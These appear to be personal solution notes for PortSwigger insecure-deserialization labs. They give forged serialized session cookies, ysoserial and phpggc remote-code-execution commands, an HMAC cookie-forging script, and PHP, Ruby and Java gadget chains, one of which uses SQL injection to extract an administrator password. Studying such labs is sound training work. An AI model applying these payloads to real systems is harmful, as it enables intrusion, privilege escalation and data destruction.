---
description: https://portswigger.net/web-security/deserialization
---

# Insecure deserialization

### Lab: Modifying serialized objects

This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges.

`Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d`

`#Decoded O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`

**Solution:**

`Cookie:` **** `session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d`

`#Decoded O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}`

### Lab: Modifying serialized data types

This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account.

`Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJkdzhrajFnaHlha3c5YzNwdjhvdHM4b3dyem93d2F4MiI7fQ%3d%3d`&#x20;

`#Decoded O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dw8kj1ghyakw9c3pv8ots8owrzowwax2";}`

`Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImR3OGtqMWdoeWFrdzljM3B2OG90czhvd3J6b3d3YXgyIjt9`

`#Decoded O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:32:"dw8kj1ghyakw9c3pv8ots8owrzowwax2";}`

**In response:**

PHP Fatal error: Uncaught Exception: (DEBUG: $access\_tokens\[$user->username] = af827mchu563btdedvusarv5gpp0ptqe, $user->access\_token = dw8kj1ghyakw9c3pv8ots8owrzowwax2, $access\_tokens = \[rgocjqa2qd2z5kw3haze01wf1a8jva8s, af827mchu563btdedvusarv5gpp0ptqe, dw8kj1ghyakw9c3pv8ots8owrzowwax2]) Invalid access token for user administrator in /var/www/index.php:7

**Solution:**

`Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImFmODI3bWNodTU2M2J0ZGVkdnVzYXJ2NWdwcDBwdHFlIjt9`

`#Decoded O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:32:"af827mchu563btdedvusarv5gpp0ptqe";}`

**Intended solution:**

`O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`

### Lab: Using application functionality to exploit insecure deserialization

This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.

`Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJyOGxlNHhhNmg3cXcwMjdzeHpoYTRtcG1oZnd1c2NvZyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d`

`#Decoded O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"r8le4xa6h7qw027sxzha4mpmhfwuscog";s:11:"avatar_link";s:19:"users/wiener/avatar";}`

```
POST /my-account/delete HTTP/1.1
...
Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJyOGxlNHhhNmg3cXcwMjdzeHpoYTRtcG1oZnd1c2NvZyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL2Nhcmxvcy9hdmF0YXIiO30%3d
```

`#Decoded O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"r8le4xa6h7qw027sxzha4mpmhfwuscog";s:11:"avatar_link";s:19:"users/carlos/avatar";}`

**In response:**

PHP Fatal error: Uncaught Exception: (DEBUG: $access\_tokens\[$user->username] = hprq4c2qb94fvlxep2oa5twz4xr0xbmw, $user->access\_token = r8le4xa6h7qw027sxzha4mpmhfwuscog, $access\_tokens = \[hprq4c2qb94fvlxep2oa5twz4xr0xbmw, brnnh6yhhi71ojf91tbbjjm0qpoiawko, r8le4xa6h7qw027sxzha4mpmhfwuscog]) Invalid access token for user carlos in /var/www/index.php:7

```
POST /my-account/delete HTTP/1.1
...
Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJocHJxNGMycWI5NGZ2bHhlcDJvYTV0d3o0eHIweGJtdyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL2Nhcmxvcy9hdmF0YXIiO30%3d
```

`#Decoded O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"hprq4c2qb94fvlxep2oa5twz4xr0xbmw";s:11:"avatar_link";s:19:"users/carlos/avatar";}`

**IIn response:**

PHP Warning: file\_put\_contents(users/carlos/disabled): failed to open stream: No such file or directory in /home/carlos/User.php on line 45 PHP Fatal error: Uncaught Exception: Could not write to users/carlos/disabled in /home/carlos/User.php:46 Stack trace: #0 Command line code(5): User->delete()

**Solution:**

```
POST /my-account/delete HTTP/1.1
...
Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJocHJxNGMycWI5NGZ2bHhlcDJvYTV0d3o0eHIweGJtdyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```

`#Decoded O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"hprq4c2qb94fvlxep2oa5twz4xr0xbmw";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}`

### Lab: Arbitrary object injection in PHP

This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access to solve this lab.

```
<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->

GET /libs/CustomTemplate.php~ HTTP/1.1
In response:

<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

**Solution:**

```
GET /libs/CustomTemplate.php HTTP/1.1
...
Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3d%3d
```

`#Decoded O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`

### Lab: Exploiting Java deserialization with Apache Commons

This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

[https://github.com/frohoff/ysoserial\
https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar](https://github.com/frohoff/ysoserialhttps://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)

**`$ java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections1 "rm /home/carlos/morale.txt" | base64`**

**Solution:**

URL Encoded -> Cookie: session=WRITEHERE

### Lab: Exploiting PHP deserialization with a pre-built gadget chain

This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos's home directory.

```
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```

**URL Decoded - Session Cookie:**

`{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ4YnZiZmczMWM4OGtuYXVuOGd3aGIybTdiNXN1YXhsNCI7fQ==","sig_hmac_sha1":"814bb8d5ba38f2dbef9e2c84801ebb6a523a0bac"}`

**Base64 Decoded:**

`{"token":"O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"xbvbfg31c88knaun8gwhb2m7b5suaxl4";}","sig_hmac_sha1":"814bb8d5ba38f2dbef9e2c84801ebb6a523a0bac"}`

Changed username to carlos, then sent the request. The response:

```
<p class=is-warning>Internal Server Error: Symfony Version: 4.3.6</p>
<p class=is-warning>PHP Fatal error:  Uncaught Exception: Signature does 
not match session in /var/www/index.php:7
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 7

Symfony Version: 4.3.6
```

_phpinfo.php_ -> SECRET\_KEY: of9b3wias30bxxqe32jr0buiqcteiy2l

**`$ phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64`**

```
<?php
$object = "WRITEHERE";
$secretKey = "of9b3wias30bxxqe32jr0buiqcteiy2l";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
?>
```

**Solution:**

**`$ php symfony.php -> Session Cookie value`**

### Lab: Exploiting Ruby deserialization using a documented gadget chain

This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There is a documented exploit that enables remote code execution via a gadget chain in this framework.

To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

`Cookie: session=BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVxbG5kYWMwa2dxbWsybDV1d28zeXF3NG1hdjg5and0eQY7B0YK`

`#Decoded o: User:@usernameI"wiener:EF:@access_tokenI"%qlndac0kgqmk2l5uwo3yqw4mav89jwty;F`

`Cookie: session=BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILY2FybG9zBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVxbG5kYWMwa2dxbWsybDV1d28zeXF3NG1hdjg5and0eQY7B0YK`

`#Decoded o: User:@usernameI"carlos:EF:@access_tokenI"%qlndac0kgqmk2l5uwo3yqw4mav89jwty;F`

**In response:**

index.rb:19:in \`\<main>': Invalid access token for user carlos (RuntimeError)

[https://www.elttam.com/blog/ruby-deserialization/#generating-the-payload](https://www.elttam.com/blog/ruby-deserialization/#generating-the-payload)

> stub\_specification.instance\_variable\_set(:@loaded\_from, "|rm /home/carlos/morale.txt")

**Solution:**

**`$ ruby rubyDeserialization.rb -> Session Cookie value`**

### Lab: Developing a custom gadget chain for Java deserialization

This lab uses a serialization-based session mechanism. If you can construct a suitable gadget chain, you can exploit this lab's insecure deserialization to obtain the administrator's password.

To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password. Then, log in as the administrator and delete Carlos's account.

```
POST /login HTTP/1.1

HTTP/1.1 302 Found
Location: /my-account
Set-Cookie: session=rO0ABXNyACJkYXRhLnNlc3Npb24udG9rZW4uQWNjZXNzVG9rZW5Vc2Vyc1%2bhUBRJ0u8CAAJMAAthY2Nlc3NUb2tlbnQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHVzZXJuYW1lcQB%2bAAF4cHQAIGZuajZvZ3ZoMzFlOHVweTQ0aXRsYmN1MTZvYWhrYnFwdAAGd2llbmVy; Secure; HttpOnly; SameSite=None
Connection: close
Content-Length: 0
```

```
<!-- <a href=/backup/AccessTokenUser.java>Example user</a> -->

package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}
```

```
/backup/ProductTemplate.java

package data.productcatalog;

import common.db.ConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

ProductTemplate.readObject() method passes the template's id attribute into a SQL statement.

String sql = String.format("SELECT \* FROM products WHERE id = '%s' LIMIT 1", id);

There is a SQL Inj point.

[https://github.com/PortSwigger/serialization-examples/blob/master/java/solution/Main.java](https://github.com/PortSwigger/serialization-examples/blob/master/java/solution/Main.java)

```
$ sudo apt install openjdk-17-jdk

$ javac Main.java
$ java Main          
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAASc=
Deserialized object ID: '

The error message confirms that the website is vulnerable to Postgres-based SQL injection via this deserialized object.

- Enumerate the number of columns in the table (8).
- Determine the data type of the columns and identify that columns 4, 5, and 6 do not expect values of the type string. Importantly, notice that the error message reflects the string input that you entered.
- List the contents of the database and identify that there is a table called users with a column called password.

$ javac Main.java
$ java Main 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAXycgVU5JT04gU0VMRUNUIE5VTEwsIE5VTEwsIE5VTEwsIENBU1QocGFzc3dvcmQgQVMgbnVtZXJpYyksIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwgRlJPTSB1c2Vycy0t
Deserialized object ID: ' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--

<p class=is-warning>
org.apache.commons.lang3.SerializationException: 
java.io.IOException: org.postgresql.util.PSQLException: 
ERROR: invalid input syntax for type numeric: &quot;j8pqu2mxfs22wimc3u04&quot;
</p>
```

**administrator:j8pqu2mxfs22wimc3u04**

### Lab: Developing a custom gadget chain for PHP deserialization

This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution. To solve the lab, delete the morale.txt file from Carlos's home directory.

```
<!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->

/cgi-bin/libs/CustomTemplate.php~

<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

```
Set-Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6
InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJmdDE1YW10M3dzZXAxcmMwYzZ2Nm1teThvNmJoa2l2ciI7fQ%3d%3d
```

`#Decoded O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ft15amt3wsep1rc0c6v6mmy8o6bhkivr";}`

```
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = "exec"
```

```
Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTc6ImRlZmF1bHRfZGVzY190eXBlIjtzOjI2OiJybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7czo0OiJkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjg6ImNhbGxiYWNrIjtzOjQ6ImV4ZWMiO319
```

`#Decoded O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}`
